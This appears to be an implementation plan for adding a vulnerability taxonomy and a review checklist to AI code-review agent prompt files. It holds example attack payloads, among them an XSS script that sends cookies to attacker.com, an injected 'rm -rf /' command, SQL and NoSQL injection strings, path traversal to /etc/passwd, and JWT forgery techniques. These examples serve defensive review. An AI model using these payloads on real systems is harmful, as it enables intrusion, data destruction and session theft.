# Warden Security Intelligence Enhancement Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a `## Security Intelligence` section to all three warden agents giving Warden a full attack vector taxonomy, exploit path reasoning, and a structured threat checklist for reviews.

**Architecture:** Create one canonical reference file (`warden-security-intelligence.md`) containing the full Security Intelligence content, then paste it into all three agent files after the role block. The review agent additionally has its existing 4-check Security section replaced with a tier-organized threat checklist.

**Tech Stack:** Markdown file editing only — no code, no tests, no build step.

---

## File Map

| Action | File |
|--------|------|
| Create | `~/.claude/agents/warden-security-intelligence.md` |
| Modify | `~/.claude/agents/warden-consult.md` |
| Modify | `~/.claude/agents/warden-implement.md` |
| Modify | `~/.claude/agents/warden-review.md` |

---

### Task 1: Create canonical reference file

**Files:**
- Create: `~/.claude/agents/warden-security-intelligence.md`

- [ ] **Step 1: Create the file**

Create `$HOME/.claude/agents/warden-security-intelligence.md` with this exact content:

```markdown
---
name: warden-security-intelligence
description: Canonical Security Intelligence reference for warden agents. Not an agent — a shared reference file. Update here, then paste into all three warden agents.
---

## Security Intelligence

### Tier 1 — OWASP Core (always check)

**SQL Injection**
- Signature: String-concatenated queries, template literals with user input in SQL strings
- Exploit: `"SELECT * FROM users WHERE id = " + req.params.id` — attacker passes `1 OR 1=1` to dump table
- Fix: Parameterized queries only — `db.query("SELECT * FROM users WHERE id = $1", [req.params.id])`

**NoSQL Injection**
- Signature: MongoDB/similar queries accepting object shapes directly from req.body without sanitization
- Exploit: `User.find({ email: req.body.email })` — attacker sends `{ "email": { "$gt": "" } }` to match all records
- Fix: Validate/sanitize object shapes before query; use schema validation (Zod/Joi) at the boundary

**Command Injection**
- Signature: `exec()`, `spawn()`, `child_process` calls where any argument derives from user input
- Exploit: `exec("convert " + req.body.filename)` — attacker passes `image.jpg; rm -rf /`
- Fix: Avoid shell execution; if unavoidable use `execFile` with argument array (no shell interpolation); whitelist allowed values

**XSS (Stored/Reflected)**
- Signature: `innerHTML`, `dangerouslySetInnerHTML`, `document.write`, `element.outerHTML` set with user data
- Exploit: Stored comment containing `<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`
- Fix: Encode output (DOMPurify for HTML, `textContent` not `innerHTML`); set `Content-Security-Policy: script-src 'self'`

**XSS (DOM-based)**
- Signature: `location.hash`, `URLSearchParams.get()`, `document.referrer` feeding into DOM manipulation
- Exploit: `document.getElementById('msg').innerHTML = location.hash.slice(1)` — attacker links to `page#<img src=x onerror=alert(1)>`
- Fix: Treat all URL-derived data as untrusted; sanitize before DOM insertion; use `textContent` not `innerHTML`

**Broken Authentication / JWT**
- Signature: JWT `alg` read from token header; weak/hardcoded secret; missing `exp` check; session not invalidated on logout
- Exploit (alg:none): Attacker removes signature and sets `alg: none` — server skips verification
- Exploit (HS256/RS256 confusion): Server uses RS256; attacker switches to HS256 and signs with public key as HMAC secret
- Fix: Hardcode algorithm in verification (`{ algorithms: ['RS256'] }`); ≥256-bit secret from env; verify `exp`; maintain server-side token blocklist for logout

**IDOR / Broken Access Control**
- Signature: `WHERE id = req.params.id` or `findById(req.params.id)` without checking ownership
- Exploit: Authenticated user changes `GET /api/invoices/1234` to `GET /api/invoices/5678` — sees another user's invoice
- Fix: Always scope to authenticated user: `WHERE id = $1 AND owner_id = $2` with `[req.params.id, req.user.id]`

**Path Traversal**
- Signature: `fs.readFile(basePath + req.params.file)` or `path.join(dir, userInput)` without validation
- Exploit: `GET /files?name=../../etc/passwd` — `path.join('/uploads', '../../etc/passwd')` = `/etc/passwd`
- Fix: `const resolved = path.resolve(BASE_DIR, req.params.file); if (!resolved.startsWith(BASE_DIR)) throw new Error('forbidden')`

**Mass Assignment**
- Signature: `Object.assign(record, req.body)`, `Model.create(req.body)`, spreading request body into ORM update
- Exploit: User sends `{ "name": "Alice", "isAdmin": true }` — isAdmin gets written to DB
- Fix: Explicit allowlist: `const { name, email } = req.body; Model.update({ name, email }, { where: { id } })`

**Insecure Deserialization**
- Signature: `JSON.parse` on untrusted input fed to `eval`; YAML/pickle deserialization with user-supplied data
- Exploit: `eval(JSON.parse(req.body.config))` — attacker sends `{"__proto__": ...}` or code string
- Fix: Validate schema after parse (Zod/Joi); never eval deserialized content; use safe YAML loader

**Security Misconfiguration**
- Signature: Stack traces in error responses; debug endpoints without env guard; default credentials in config
- Exploit: Error response leaks `at Object.<anonymous> (/app/src/db/queries.js:45:12)` — reveals file structure and query logic
- Fix: Generic error messages in production: `res.status(500).json({ error: 'Internal server error' })`; gate debug routes on `NODE_ENV !== 'production'`

**Sensitive Data Exposure**
- Signature: Passwords/tokens in `console.log`; API keys in client-side bundle; PII in GET query params (logged by proxies)
- Exploit: `console.log('User login:', { email, password })` — password appears in log aggregation tooling
- Fix: Never log credentials; scrub sensitive fields before logging; use POST for sensitive data; audit client bundles with `webpack-bundle-analyzer`

---

### Tier 2 — Advanced / Full-Stack Vectors (always check on authenticated surfaces)

**SSRF (Server-Side Request Forgery)**
- Exploit: User-controlled URL passed to server-side HTTP client. Attacker targets `http://169.254.169.254/latest/meta-data/` (AWS metadata), internal services at `http://internal-db:5432`, or `http://localhost:8080/admin`.
- Signature: `fetch(req.body.url)`, `axios.get(req.query.webhookUrl)`, `got(req.body.callback)` — any HTTP call where hostname/URL derives from user input
- Fix:
```javascript
import { URL } from 'url';
import dns from 'dns/promises';
const PRIVATE_RANGES = [/^10\./, /^172\.(1[6-9]|2\d|3[01])\./, /^192\.168\./, /^127\./, /^169\.254\./];
async function isSafeUrl(rawUrl) {
  const { hostname } = new URL(rawUrl);
  const { address } = await dns.lookup(hostname);
  return !PRIVATE_RANGES.some(r => r.test(address));
}
```

**JWT Algorithm Confusion**
- Exploit: Server configured for RS256 (asymmetric). Attacker obtains public key (often exposed at `/.well-known/jwks.json`), changes token header to `HS256`, and signs with the public key as the HMAC secret. Server verifies the HMAC using the public key — succeeds.
- Signature: `jwt.verify(token, publicKey)` without `{ algorithms: ['RS256'] }` option
- Fix: `jwt.verify(token, publicKey, { algorithms: ['RS256'] })` — never derive algorithm from token header

**JWT None Algorithm**
- Exploit: Some JWT libraries accept `alg: none` as a valid algorithm, skipping signature verification entirely. Attacker crafts `{"alg":"none","typ":"JWT"}` header with arbitrary payload and empty signature.
- Signature: Missing `algorithms` option in `jwt.verify()`; library version known to accept `none`
- Fix: `jwt.verify(token, secret, { algorithms: ['HS256'] })` — explicit allowlist that excludes `none`

**CSRF (Cross-Site Request Forgery)**
- Exploit: Victim is logged in to `app.com`. Attacker's page at `evil.com` contains a hidden form that POSTs to `app.com/transfer`. Browser includes session cookie automatically. No CSRF token = attack succeeds.
- Signature: Mutation endpoints (POST/PUT/DELETE/PATCH) authenticated via cookies only, no CSRF token, no `SameSite` cookie attribute, no `Origin` header check
- Fix: `Set-Cookie: session=...; SameSite=Strict; HttpOnly; Secure` — or add CSRF middleware: `app.use(csurf())` with token validation on all state-changing routes

**Prototype Pollution**
- Exploit: `_.merge({}, JSON.parse(req.body))` where body is `{"__proto__": {"isAdmin": true}}`. Pollutes `Object.prototype` — every subsequent `{}.isAdmin` returns `true` in the same process.
- Signature: `_.merge`, `deepmerge`, recursive spread, or any deep-merge where source is user-supplied
- Fix:
```javascript
function sanitizeKeys(obj) {
  if (typeof obj !== 'object' || obj === null) return obj;
  const safe = Object.create(null);
  for (const [k, v] of Object.entries(obj)) {
    if (['__proto__', 'constructor', 'prototype'].includes(k)) continue;
    safe[k] = sanitizeKeys(v);
  }
  return safe;
}
const safeBody = sanitizeKeys(req.body);
```

**Race Condition / TOCTOU (Time-of-Check Time-of-Use)**
- Exploit: `if (user.balance >= amount) { await deductBalance(amount) }`. Two concurrent requests both read balance = 100, both pass the check for amount = 80, both deduct — balance goes to -60.
- Signature: Read-then-write on shared mutable state (balance, inventory count, rate limit counter, seat reservation) without database-level atomicity
- Fix (PostgreSQL): `UPDATE accounts SET balance = balance - $1 WHERE id = $2 AND balance >= $1 RETURNING balance` — atomic check-and-act, returns nothing if insufficient

**ReDoS (Regular Expression Denial of Service)**
- Exploit: Input `aaaaaaaaaaaaaaaaaaaaaaaaaaab` fed to `/(a+)+$/` triggers catastrophic backtracking — O(2^n) time, blocks Node.js event loop for seconds.
- Signature: `userInput.match(/pattern/)` or `regex.test(userInput)` where pattern has nested quantifiers (`(a+)+`, `(a|a)*`, `(a*)*`)
- Fix: Run regexes through a ReDoS checker (use `safe-regex` or `redos-detector`); replace problematic patterns with linear alternatives; set timeout via worker thread if pattern is complex

**GraphQL-Specific Attacks**
- Exploit (Introspection): `{ __schema { types { name fields { name } } } }` — maps entire API surface, finds hidden/internal fields
- Exploit (Depth): `{ user { friends { friends { friends { ... } } } } }` — 20 levels deep, triggers N+1 and memory exhaustion
- Exploit (Batching): `[{"query":"mutation { deleteUser(id:1)"},{"query":"mutation { deleteUser(id:2)"}...]` — 1000 mutations bypass per-request rate limit
- Fix: Disable introspection: `introspection: process.env.NODE_ENV === 'development'`; add depth limit plugin (graphql-depth-limit, max 7); complexity scoring (graphql-query-complexity); per-query rate limiting separate from HTTP rate limiting

**Open Redirect**
- Exploit: `res.redirect(req.query.returnTo)` — attacker sends `?returnTo=https://evil.com/phishing` in password reset email link. User clicks legitimate-looking domain, lands on attacker site.
- Signature: `res.redirect(req.query.*)`, `res.redirect(req.body.*)` — any redirect where destination derives from user input
- Fix:
```javascript
const ALLOWED_PATHS = /^\/[a-z0-9\-/_]+$/i;
const returnTo = req.query.returnTo;
if (!returnTo || !ALLOWED_PATHS.test(returnTo)) return res.redirect('/dashboard');
res.redirect(returnTo);
```

**Clickjacking**
- Exploit: Attacker embeds `<iframe src="https://app.com/settings/delete-account">` in their page. Overlays transparent UI. User thinks they're clicking attacker's button — actually clicks "Delete Account" in the iframe.
- Signature: Missing `X-Frame-Options` header; missing `frame-ancestors` directive in Content-Security-Policy
- Fix: Add to all responses: `res.setHeader('X-Frame-Options', 'DENY')` and `Content-Security-Policy: frame-ancestors 'none'`

**Supply Chain**
- Exploit: `npm install` pulls in `lodash` typosquatted as `loadsh` (malicious). Or legitimate dependency version with unpatched CVE (e.g., log4shell-style RCE via transitive dep).
- Signature: New dependency added without `npm audit`; `*` or `latest` version range; package name resembles popular package but has low download count
- Fix: Run `npm audit --audit-level=high` in CI; pin exact versions for security-critical deps in package.json; review new package publisher and download count before adding

---

### Finding Reporting Standard

Every security finding **must** include all three components. A finding missing any component is incomplete — do not raise it.

1. **Vector class** — name the specific attack (e.g., "SSRF", "JWT Algorithm Confusion", "Prototype Pollution")
2. **Exploit path** — trace the exact code path (`file:line → file:line`), identify what the attacker controls, what they reach, and what the impact is
3. **Hardened replacement** — the fixed code inline, not a prose description of the fix
```

- [ ] **Step 2: Verify file exists**

```bash
ls -la $HOME/.claude/agents/warden-security-intelligence.md
```

Expected: file listed with non-zero size (should be ~6KB+).

---

### Task 2: Update warden-consult.md

**Files:**
- Modify: `$HOME/.claude/agents/warden-consult.md`

- [ ] **Step 1: Read the current file**

Read `$HOME/.claude/agents/warden-consult.md` and identify the exact line where `## Mode: Consult` appears.

- [ ] **Step 2: Insert Security Intelligence section**

Insert the following block immediately BEFORE the line `## Mode: Consult`:

```markdown
## Security Intelligence

### Tier 1 — OWASP Core (always check)

**SQL Injection**
- Signature: String-concatenated queries, template literals with user input in SQL strings
- Exploit: `"SELECT * FROM users WHERE id = " + req.params.id` — attacker passes `1 OR 1=1` to dump table
- Fix: Parameterized queries only — `db.query("SELECT * FROM users WHERE id = $1", [req.params.id])`

**NoSQL Injection**
- Signature: MongoDB/similar queries accepting object shapes directly from req.body without sanitization
- Exploit: `User.find({ email: req.body.email })` — attacker sends `{ "email": { "$gt": "" } }` to match all records
- Fix: Validate/sanitize object shapes before query; use schema validation (Zod/Joi) at the boundary

**Command Injection**
- Signature: `exec()`, `spawn()`, `child_process` calls where any argument derives from user input
- Exploit: `exec("convert " + req.body.filename)` — attacker passes `image.jpg; rm -rf /`
- Fix: Avoid shell execution; if unavoidable use `execFile` with argument array (no shell interpolation); whitelist allowed values

**XSS (Stored/Reflected)**
- Signature: `innerHTML`, `dangerouslySetInnerHTML`, `document.write`, `element.outerHTML` set with user data
- Exploit: Stored comment containing `<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`
- Fix: Encode output (DOMPurify for HTML, `textContent` not `innerHTML`); set `Content-Security-Policy: script-src 'self'`

**XSS (DOM-based)**
- Signature: `location.hash`, `URLSearchParams.get()`, `document.referrer` feeding into DOM manipulation
- Exploit: `document.getElementById('msg').innerHTML = location.hash.slice(1)` — attacker links to `page#<img src=x onerror=alert(1)>`
- Fix: Treat all URL-derived data as untrusted; sanitize before DOM insertion; use `textContent` not `innerHTML`

**Broken Authentication / JWT**
- Signature: JWT `alg` read from token header; weak/hardcoded secret; missing `exp` check; session not invalidated on logout
- Exploit (alg:none): Attacker removes signature and sets `alg: none` — server skips verification
- Exploit (HS256/RS256 confusion): Server uses RS256; attacker switches to HS256 and signs with public key as HMAC secret
- Fix: Hardcode algorithm in verification (`{ algorithms: ['RS256'] }`); ≥256-bit secret from env; verify `exp`; maintain server-side token blocklist for logout

**IDOR / Broken Access Control**
- Signature: `WHERE id = req.params.id` or `findById(req.params.id)` without checking ownership
- Exploit: Authenticated user changes `GET /api/invoices/1234` to `GET /api/invoices/5678` — sees another user's invoice
- Fix: Always scope to authenticated user: `WHERE id = $1 AND owner_id = $2` with `[req.params.id, req.user.id]`

**Path Traversal**
- Signature: `fs.readFile(basePath + req.params.file)` or `path.join(dir, userInput)` without validation
- Exploit: `GET /files?name=../../etc/passwd` — `path.join('/uploads', '../../etc/passwd')` = `/etc/passwd`
- Fix: `const resolved = path.resolve(BASE_DIR, req.params.file); if (!resolved.startsWith(BASE_DIR)) throw new Error('forbidden')`

**Mass Assignment**
- Signature: `Object.assign(record, req.body)`, `Model.create(req.body)`, spreading request body into ORM update
- Exploit: User sends `{ "name": "Alice", "isAdmin": true }` — isAdmin gets written to DB
- Fix: Explicit allowlist: `const { name, email } = req.body; Model.update({ name, email }, { where: { id } })`

**Insecure Deserialization**
- Signature: `JSON.parse` on untrusted input fed to `eval`; YAML/pickle deserialization with user-supplied data
- Exploit: `eval(JSON.parse(req.body.config))` — attacker sends `{"__proto__": ...}` or code string
- Fix: Validate schema after parse (Zod/Joi); never eval deserialized content; use safe YAML loader

**Security Misconfiguration**
- Signature: Stack traces in error responses; debug endpoints without env guard; default credentials in config
- Exploit: Error response leaks `at Object.<anonymous> (/app/src/db/queries.js:45:12)` — reveals file structure and query logic
- Fix: Generic error messages in production: `res.status(500).json({ error: 'Internal server error' })`; gate debug routes on `NODE_ENV !== 'production'`

**Sensitive Data Exposure**
- Signature: Passwords/tokens in `console.log`; API keys in client-side bundle; PII in GET query params (logged by proxies)
- Exploit: `console.log('User login:', { email, password })` — password appears in log aggregation tooling
- Fix: Never log credentials; scrub sensitive fields before logging; use POST for sensitive data; audit client bundles with `webpack-bundle-analyzer`

---

### Tier 2 — Advanced / Full-Stack Vectors (always check on authenticated surfaces)

**SSRF (Server-Side Request Forgery)**
- Exploit: User-controlled URL passed to server-side HTTP client. Attacker targets `http://169.254.169.254/latest/meta-data/` (AWS metadata), internal services at `http://internal-db:5432`, or `http://localhost:8080/admin`.
- Signature: `fetch(req.body.url)`, `axios.get(req.query.webhookUrl)`, `got(req.body.callback)` — any HTTP call where hostname/URL derives from user input
- Fix:
```javascript
import { URL } from 'url';
import dns from 'dns/promises';
const PRIVATE_RANGES = [/^10\./, /^172\.(1[6-9]|2\d|3[01])\./, /^192\.168\./, /^127\./, /^169\.254\./];
async function isSafeUrl(rawUrl) {
  const { hostname } = new URL(rawUrl);
  const { address } = await dns.lookup(hostname);
  return !PRIVATE_RANGES.some(r => r.test(address));
}
```

**JWT Algorithm Confusion**
- Exploit: Server configured for RS256 (asymmetric). Attacker obtains public key (often exposed at `/.well-known/jwks.json`), changes token header to `HS256`, and signs with the public key as the HMAC secret. Server verifies the HMAC using the public key — succeeds.
- Signature: `jwt.verify(token, publicKey)` without `{ algorithms: ['RS256'] }` option
- Fix: `jwt.verify(token, publicKey, { algorithms: ['RS256'] })` — never derive algorithm from token header

**JWT None Algorithm**
- Exploit: Some JWT libraries accept `alg: none` as a valid algorithm, skipping signature verification entirely. Attacker crafts `{"alg":"none","typ":"JWT"}` header with arbitrary payload and empty signature.
- Signature: Missing `algorithms` option in `jwt.verify()`; library version known to accept `none`
- Fix: `jwt.verify(token, secret, { algorithms: ['HS256'] })` — explicit allowlist that excludes `none`

**CSRF (Cross-Site Request Forgery)**
- Exploit: Victim is logged in to `app.com`. Attacker's page at `evil.com` contains a hidden form that POSTs to `app.com/transfer`. Browser includes session cookie automatically. No CSRF token = attack succeeds.
- Signature: Mutation endpoints (POST/PUT/DELETE/PATCH) authenticated via cookies only, no CSRF token, no `SameSite` cookie attribute, no `Origin` header check
- Fix: `Set-Cookie: session=...; SameSite=Strict; HttpOnly; Secure` — or add CSRF middleware: `app.use(csurf())` with token validation on all state-changing routes

**Prototype Pollution**
- Exploit: `_.merge({}, JSON.parse(req.body))` where body is `{"__proto__": {"isAdmin": true}}`. Pollutes `Object.prototype` — every subsequent `{}.isAdmin` returns `true` in the same process.
- Signature: `_.merge`, `deepmerge`, recursive spread, or any deep-merge where source is user-supplied
- Fix:
```javascript
function sanitizeKeys(obj) {
  if (typeof obj !== 'object' || obj === null) return obj;
  const safe = Object.create(null);
  for (const [k, v] of Object.entries(obj)) {
    if (['__proto__', 'constructor', 'prototype'].includes(k)) continue;
    safe[k] = sanitizeKeys(v);
  }
  return safe;
}
const safeBody = sanitizeKeys(req.body);
```

**Race Condition / TOCTOU (Time-of-Check Time-of-Use)**
- Exploit: `if (user.balance >= amount) { await deductBalance(amount) }`. Two concurrent requests both read balance = 100, both pass the check for amount = 80, both deduct — balance goes to -60.
- Signature: Read-then-write on shared mutable state (balance, inventory count, rate limit counter, seat reservation) without database-level atomicity
- Fix (PostgreSQL): `UPDATE accounts SET balance = balance - $1 WHERE id = $2 AND balance >= $1 RETURNING balance` — atomic check-and-act, returns nothing if insufficient

**ReDoS (Regular Expression Denial of Service)**
- Exploit: Input `aaaaaaaaaaaaaaaaaaaaaaaaaaab` fed to `/(a+)+$/` triggers catastrophic backtracking — O(2^n) time, blocks Node.js event loop for seconds.
- Signature: `userInput.match(/pattern/)` or `regex.test(userInput)` where pattern has nested quantifiers (`(a+)+`, `(a|a)*`, `(a*)*`)
- Fix: Run regexes through a ReDoS checker (use `safe-regex` or `redos-detector`); replace problematic patterns with linear alternatives; set timeout via worker thread if pattern is complex

**GraphQL-Specific Attacks**
- Exploit (Introspection): `{ __schema { types { name fields { name } } } }` — maps entire API surface, finds hidden/internal fields
- Exploit (Depth): `{ user { friends { friends { friends { ... } } } } }` — 20 levels deep, triggers N+1 and memory exhaustion
- Exploit (Batching): `[{"query":"mutation { deleteUser(id:1)"},{"query":"mutation { deleteUser(id:2)"}...]` — 1000 mutations bypass per-request rate limit
- Fix: Disable introspection: `introspection: process.env.NODE_ENV === 'development'`; add depth limit plugin (graphql-depth-limit, max 7); complexity scoring (graphql-query-complexity); per-query rate limiting separate from HTTP rate limiting

**Open Redirect**
- Exploit: `res.redirect(req.query.returnTo)` — attacker sends `?returnTo=https://evil.com/phishing` in password reset email link. User clicks legitimate-looking domain, lands on attacker site.
- Signature: `res.redirect(req.query.*)`, `res.redirect(req.body.*)` — any redirect where destination derives from user input
- Fix:
```javascript
const ALLOWED_PATHS = /^\/[a-z0-9\-/_]+$/i;
const returnTo = req.query.returnTo;
if (!returnTo || !ALLOWED_PATHS.test(returnTo)) return res.redirect('/dashboard');
res.redirect(returnTo);
```

**Clickjacking**
- Exploit: Attacker embeds `<iframe src="https://app.com/settings/delete-account">` in their page. Overlays transparent UI. User thinks they're clicking attacker's button — actually clicks "Delete Account" in the iframe.
- Signature: Missing `X-Frame-Options` header; missing `frame-ancestors` directive in Content-Security-Policy
- Fix: Add to all responses: `res.setHeader('X-Frame-Options', 'DENY')` and `Content-Security-Policy: frame-ancestors 'none'`

**Supply Chain**
- Exploit: `npm install` pulls in `lodash` typosquatted as `loadsh` (malicious). Or legitimate dependency version with unpatched CVE (e.g., log4shell-style RCE via transitive dep).
- Signature: New dependency added without `npm audit`; `*` or `latest` version range; package name resembles popular package but has low download count
- Fix: Run `npm audit --audit-level=high` in CI; pin exact versions for security-critical deps in package.json; review new package publisher and download count before adding

---

### Finding Reporting Standard

Every security finding **must** include all three components. A finding missing any component is incomplete — do not raise it.

1. **Vector class** — name the specific attack (e.g., "SSRF", "JWT Algorithm Confusion", "Prototype Pollution")
2. **Exploit path** — trace the exact code path (`file:line → file:line`), identify what the attacker controls, what they reach, and what the impact is
3. **Hardened replacement** — the fixed code inline, not a prose description of the fix

```

- [ ] **Step 3: Add Threat Surface to output format**

Find this exact line in the file:
```
Output: `# Warden — Architecture & Security Brief` with sections: Architecture Proposal, Security Requirements, Efficiency Concerns, Dependencies, Integration Points. Each section: bullet list of findings with structure `[item]: detail`.
```

Replace with:
```
Output: `# Warden — Architecture & Security Brief` with sections: Architecture Proposal, Security Requirements (including Threat Surface), Efficiency Concerns, Dependencies, Integration Points. Each section: bullet list of findings with structure `[item]: detail`.

**Threat Surface sub-section format** — for each significant entry point in the proposed architecture:
```
**Threat Surface:**
- [endpoint/entry point]: applicable Tier 1 vectors → [mitigation required]; applicable Tier 2 vectors → [mitigation required]
```
```

- [ ] **Step 4: Verify**

Read the file back and confirm:
1. `## Security Intelligence` section appears before `## Mode: Consult`
2. Output format line mentions "Threat Surface"

---

### Task 3: Update warden-implement.md

**Files:**
- Modify: `$HOME/.claude/agents/warden-implement.md`

- [ ] **Step 1: Read the current file**

Read `$HOME/.claude/agents/warden-implement.md` and identify the line where `## Mode: Implement` appears.

- [ ] **Step 2: Insert Security Intelligence section**

Insert the identical `## Security Intelligence` block (same full content as Task 2 Step 2) immediately BEFORE the line `## Mode: Implement`.

- [ ] **Step 3: Verify**

Read the file back and confirm:
1. `## Security Intelligence` section appears before `## Mode: Implement`
2. All Tier 1 and Tier 2 vectors are present with exploit + fix content

---

### Task 4: Update warden-review.md

**Files:**
- Modify: `$HOME/.claude/agents/warden-review.md`

- [ ] **Step 1: Read the current file**

Read `$HOME/.claude/agents/warden-review.md` and identify:
1. The line where `## Mode: Review` appears
2. The `### Security (4 checks)` block and its full extent (all 4 bullet points)

- [ ] **Step 2: Insert Security Intelligence section**

Insert the identical `## Security Intelligence` block (same full content as Task 2 Step 2) immediately BEFORE the line `## Mode: Review`.

- [ ] **Step 3: Replace Security checklist**

Find and replace this exact block:
```
### Security (4 checks)
- **Input validation:** Is all user input validated and sanitized at system boundaries?
- **Authentication/Authorization:** Are auth checks present? Privilege escalation risks?
- **Injection:** SQL injection, XSS, command injection, path traversal? Before flagging SQL injection on any template literal or string construction: trace every variable interpolated into the SQL string back to its source. If the interpolated content is exclusively integer indices, positional placeholder tokens ($1, $2...), or other non-user-supplied values — it is not injection. Downgrade to a style note at most. The test: can user-controlled input reach the SQL string directly? If no, the parameterization is correct and the query is safe.
- **Secrets:** Are credentials, API keys, or tokens hardcoded or logged?
```

Replace with:
```
### Security — Tier 1: OWASP Core (always check)

For each item: if present in changeset, check. If finding exists, apply the three-part reporting standard (vector class + exploit path + hardened replacement). If not applicable, mark `N/A`.

- **SQL / NoSQL / Command Injection:** Trace every variable in queries/exec calls to source — is user input reachable? Interpolated integer indices or positional placeholders (`$1`, `$2`) are NOT injection. Only flag if user-controlled data reaches the string directly.
- **XSS (Stored / Reflected / DOM):** innerHTML/dangerouslySetInnerHTML with user data; URL fragment/referrer feeding DOM
- **Broken Auth / JWT:** Algorithm derived from token header; hardcoded secret; missing exp check; no server-side invalidation
- **IDOR / Broken Access Control:** Object fetched by ID without ownership scope; privilege escalation paths
- **Path Traversal:** File paths constructed with user input without `path.resolve` + base-dir assertion
- **Mass Assignment:** req.body spread/assigned to model without explicit field allowlist
- **Security Misconfiguration:** Stack traces in error responses; debug endpoints without env guard
- **Sensitive Data Exposure / Secrets:** Credentials in logs; API keys in client bundle; PII in GET params

### Security — Tier 2: Advanced Vectors (always check on authenticated surfaces)

Check each item only if the relevant pattern is present in the changeset. Mark `N/A — [reason]` otherwise.

- **SSRF:** HTTP calls with user-controlled URL/hostname — check for RFC-1918 + loopback allowlist
- **CSRF:** State-changing endpoints (POST/PUT/DELETE/PATCH) — SameSite cookie? CSRF token? Origin check?
- **JWT Algorithm Confusion / None:** `jwt.verify()` without explicit `algorithms` option
- **Prototype Pollution:** Deep merge (`_.merge`, `deepmerge`, recursive spread) with user-supplied source
- **Race Condition / TOCTOU:** Read-then-write on shared mutable state without atomic DB operation
- **ReDoS:** User input reaching regex with nested quantifiers
- **GraphQL:** Introspection in prod; missing depth/complexity limits; batching bypass of rate limits
- **Open Redirect:** `res.redirect()` with user-supplied destination
- **Clickjacking:** Missing `X-Frame-Options` / `frame-ancestors` CSP on frameable UI
- **Supply Chain:** New dependencies added — was `npm audit` run? Version pinned?
```

- [ ] **Step 4: Verify**

Read the file back and confirm:
1. `## Security Intelligence` section appears before `## Mode: Review`
2. Old `### Security (4 checks)` block is gone
3. New `### Security — Tier 1` and `### Security — Tier 2` blocks are present
4. The SQL injection phantom-finding rule is preserved in the Tier 1 SQL/NoSQL/Command Injection entry

---

## Self-Review

**Spec coverage check:**
- [x] Canonical reference file — Task 1
- [x] Tier 1: all 12 OWASP vectors with signature + exploit + fix — Tasks 1–4 (Security Intelligence block)
- [x] Tier 2: all 11 advanced vectors with exploit path + hardened fix code — Tasks 1–4 (Security Intelligence block)
- [x] Finding reporting standard (3-part: vector + exploit path + hardened code) — Security Intelligence block
- [x] consult: Threat Surface sub-section in output format — Task 2 Step 3
- [x] implement: full intelligence block, no output format change needed — Task 3
- [x] review: Security checklist replaced with Tier 1 + Tier 2 structured checklist — Task 4 Step 3
- [x] SQL injection phantom-finding rule preserved in Tier 1 checklist — Task 4 Step 3

**Placeholder scan:** No TBDs, no "similar to Task N" references. All content complete in each task. Fix code provided inline for every Tier 2 vector.

**Type consistency:** Markdown content only. Section headers consistent across all tasks. "Security Intelligence" naming consistent throughout.
